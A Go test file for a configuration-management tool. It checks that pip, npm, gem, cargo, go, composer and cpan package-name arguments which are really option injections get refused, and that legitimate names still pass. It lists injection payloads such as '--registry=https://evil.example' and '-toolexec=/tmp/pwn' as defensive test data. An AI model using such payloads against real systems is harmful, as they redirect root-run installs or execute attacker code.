package builtin

import (
	"fmt"
	"strings"
	"testing"

	"github.com/edlitmus/halite/internal/exec"
	"github.com/edlitmus/halite/internal/signature"
	"github.com/edlitmus/halite/internal/value"
)

// A package name given to a language package manager is refused before it
// can become that manager's option -- the M-32 fix of issue #321, which
// went into the OS package managers (pkg_name_injection_test.go) and not
// into these. DIVERGENCE 5.568.
//
// # What this reproduces
//
// `npm.installed` with `pkgs: ["--registry=https://evil.example", left-pad]`
// ran `npm install --global --registry=https://evil.example left-pad`: a
// root-run state installing from an index the tree did not name, chosen
// by whoever could write that list. gem's `--source=`, pip's
// `--index-url=`, cargo's `--git=`, go's `-toolexec=` (which runs a
// program of the caller's choosing for every compile) and cpan's `-j`
// (which loads a Perl file as its configuration) are the same door.
//
// The runner records rather than runs, and every tool is declared present,
// so what is asserted is the argv halite would have handed the tool --
// and, for a refused call, that there was none at all.

func langInjectionCtx(test bool) (*exec.Context, *exec.RecordingRunner) {
	rec := &exec.RecordingRunner{
		// The states read the installed list first; an empty one makes every
		// requested package missing, so a state that did not refuse would go
		// on to install it.
		Responses: map[string]exec.Result{
			"npm ls --json --depth=0 --global": {Stdout: `{}`},
			"pip list --format=json":           {Stdout: `[]`},
		},
	}
	c := newCtx(test)
	c.Runner = rec
	c.Lookup = func(name string) string { return "/usr/bin/" + name }
	return c, rec
}

const (
	pipIndexPayload    = "--index-url=https://evil.example/simple"
	npmRegistryPayload = "--registry=https://evil.example"
	gemSourcePayload   = "--source=https://evil.example"
	cargoGitPayload    = "--git=https://evil.example/crate.git"
	goToolexecPayload  = "-toolexec=/tmp/pwn"
	composerDirPayload = "--working-dir=/"
	cpanConfigPayload  = "-j/tmp/pwn.pm"
)

// langInjectionCalls is every language-manager function that hands a
// caller-supplied name, list item or version to its tool, each with a
// payload in the argument it reads. TestLangEveryNameTakingFunctionIsCovered
// holds this list to the registry.
func langInjectionCalls() []pkgInjectionCall {
	return []pkgInjectionCall{
		{"pip.install", false, value.MapOf("pkgs", []any{pipIndexPayload, "requests"})},
		{"pip.uninstall", false, value.MapOf("pkgs", []any{"-r/etc/requirements.txt"})},
		{"pip.installed", true, value.MapOf("name", pipIndexPayload)},
		{"pip.installed", true, value.MapOf("name", "x", "pkgs", []any{"requests", pipIndexPayload})},
		{"pip.installed", true, value.MapOf("name", "requests\n--index-url=x")},
		{"pip.removed", true, value.MapOf("name", "x", "pkgs", []any{pipIndexPayload})},

		{"npm.install", false, value.MapOf("pkgs", []any{npmRegistryPayload, "left-pad"})},
		{"npm.uninstall", false, value.MapOf("pkgs", []any{npmRegistryPayload})},
		{"npm.installed", true, value.MapOf("name", npmRegistryPayload)},
		{"npm.installed", true, value.MapOf("name", "x", "pkgs", []any{npmRegistryPayload, "left-pad"})},
		{"npm.removed", true, value.MapOf("name", "x", "pkgs", []any{npmRegistryPayload})},

		{"gem.install", false, value.MapOf("gems", []any{gemSourcePayload, "rake"})},
		{"gem.install", false, value.MapOf("gems", []any{"rake"}, "version", "--source=x")},
		{"gem.uninstall", false, value.MapOf("gems", []any{"--install-dir=/"})},
		{"gem.installed", true, value.MapOf("name", gemSourcePayload)},
		{"gem.installed", true, value.MapOf("name", "x", "pkgs", []any{gemSourcePayload, "rake"})},
		{"gem.removed", true, value.MapOf("name", "x", "pkgs", []any{gemSourcePayload})},

		{"cargo.install", false, value.MapOf("crates", []any{cargoGitPayload, "ripgrep"})},
		{"cargo.install", false, value.MapOf("crates", []any{"ripgrep"}, "version", "--git=x")},
		{"cargo.uninstall", false, value.MapOf("crates", []any{"--root=/"})},

		{"go.install", false, value.MapOf("pkgs", []any{goToolexecPayload, "golang.org/x/tools/cmd/stringer@latest"})},
		{"go.env", false, value.MapOf("name", "-w")},

		{"composer.require", false, value.MapOf("dir", "/srv/app", "pkgs", []any{composerDirPayload, "monolog/monolog"})},

		{"cpan.install", false, value.MapOf("modules", []any{cpanConfigPayload, "JSON::PP"})},
	}
}

// **The payload is refused, in a dry run and a real one, and nothing at
// all runs** -- not even the installed-list read a state does first.
func TestLangRefusesOptionInjection(t *testing.T) {
	r := New()
	for _, call := range langInjectionCalls() {
		for _, test := range []bool{true, false} {
			c, rec := langInjectionCtx(test)
			var refused bool
			var said string
			if call.state {
				res, err := r.States.Call(c, call.fn, call.args)
				if err != nil {
					t.Fatalf("%s: %v", call.fn, err)
				}
				refused = res.Result != nil && !*res.Result
				said = res.Comment
			} else {
				_, err := r.Exec.Call(c, call.fn, call.args)
				refused = err != nil
				if err != nil {
					said = err.Error()
				}
			}
			where := fmt.Sprintf("%s %s", call.fn, describePkgArgs(call.args))
			if test {
				where += " (test)"
			}
			if !refused {
				t.Errorf("%s: was not refused", where)
			} else if !strings.Contains(said, "refused") {
				t.Errorf("%s: failed, but not because the name was refused: %s", where, said)
			}
			if len(rec.Ran) != 0 {
				t.Errorf("%s: ran %q; a refused name must reach no command", where, rec.RanCommands())
			}
		}
	}
}

// langNameParams are the arguments through which these modules take a
// package, gem, crate or module name.
var langNameParams = map[string]bool{"name": true, "pkgs": true, "gems": true, "crates": true, "modules": true}

// Every function of these modules that takes a name is in the list above,
// or is named here with the reason its name reaches no argv as an option.
func TestLangEveryNameTakingFunctionIsCovered(t *testing.T) {
	// cpan.module_version takes `module`, which checkPerlModuleName holds
	// to a positive grammar no option can match (DIVERGENCE 5.298), and
	// which reaches perl after `--` in any case.
	exempt := map[string]bool{}

	covered := map[string]bool{}
	for _, call := range langInjectionCalls() {
		covered[call.fn] = true
	}
	r := New()
	for _, mod := range []string{"pip", "npm", "gem", "cargo", "go", "composer", "cpan"} {
		for _, reg := range []*signature.Registry{r.Exec.Signatures(), r.States.Signatures()} {
			for _, sig := range reg.Functions(mod) {
				name := sig.Name()
				takes := false
				for _, p := range sig.Params {
					takes = takes || langNameParams[p.Name]
				}
				if takes && !covered[name] && !exempt[name] {
					t.Errorf("%s takes a name and is not in langInjectionCalls; "+
						"validate it with pkgValidateName and add it there", name)
				}
			}
		}
	}
}

// **Legitimate names still reach the tool, spelled as they were.** These
// are the shapes each ecosystem actually uses that a careless rule would
// trip on: pip's extras and comparison operators, npm's scoped `@org/name`
// and `name@version`, go's module path with `@latest`, composer's
// `vendor/name:^3.0`, cpan's `::`.
func TestLangLegitimateNamesReachTheArgv(t *testing.T) {
	cases := []struct {
		fn   string
		args *value.Map
		want string
	}{
		{"pip.install", value.MapOf("pkgs", []any{"requests[socks]>=2.31", "six==1.16.0"}),
			"pip install requests[socks]>=2.31 six==1.16.0"},
		{"npm.install", value.MapOf("pkgs", []any{"@types/node@20.1.0", "left-pad"}),
			"npm install --global @types/node@20.1.0 left-pad"},
		{"gem.install", value.MapOf("gems", []any{"rake"}, "version", "13.1.0"),
			"gem install --no-document --version 13.1.0 rake"},
		{"cargo.install", value.MapOf("crates", []any{"ripgrep"}, "version", "14.1.0"),
			"cargo install --locked --version 14.1.0 ripgrep"},
		{"go.install", value.MapOf("pkgs", []any{"golang.org/x/tools/cmd/stringer@latest"}),
			"go install golang.org/x/tools/cmd/stringer@latest"},
		{"composer.require", value.MapOf("dir", "/srv/app", "pkgs", []any{"monolog/monolog:^3.0"}),
			"composer require --no-ansi --no-interaction monolog/monolog:^3.0"},
		{"cpan.install", value.MapOf("modules", []any{"JSON::PP"}), "cpan -i JSON::PP"},
	}
	r := New()
	for _, tc := range cases {
		c, rec := langInjectionCtx(false)
		if _, err := r.Exec.Call(c, tc.fn, tc.args); err != nil {
			t.Errorf("%s: %v", tc.fn, err)
			continue
		}
		if got := rec.RanCommands(); len(got) != 1 || got[0] != tc.want {
			t.Errorf("%s ran %q\nwant [%q]", tc.fn, got, tc.want)
		}
	}

	// And through a state, a pinned name is passed whole.
	c, rec := langInjectionCtx(false)
	if _, err := r.States.Call(c, "npm.installed", value.MapOf("name", "left-pad@1.3.0")); err != nil {
		t.Fatal(err)
	}
	if got := strings.Join(rec.RanCommands(), " | "); !strings.Contains(got, "npm install --global left-pad@1.3.0") {
		t.Errorf("npm.installed ran %s", got)
	}
}
